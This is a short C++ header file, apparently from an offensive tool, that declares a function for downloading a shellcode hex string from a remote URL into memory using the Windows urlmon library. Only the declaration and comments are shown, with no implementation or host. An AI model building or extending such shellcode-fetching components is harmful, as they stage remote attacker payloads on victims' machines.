// Filename: fetcher.h
// Author: slaeryan
// Version: 1.0(Alpha Release)
// Purpose: This is the header file for fetcher.cpp


#include <urlmon.h>
#include <sstream>
#include <string>

#pragma comment(lib, "urlmon.lib") // -lurlmon(static-linking of urlmon.lib)

// To download a shellcode hex string into memory from a remote URL.
// Takes the URL as parameter and returns the shellcode hex string stored there.
std::string downloadResource(char *url);
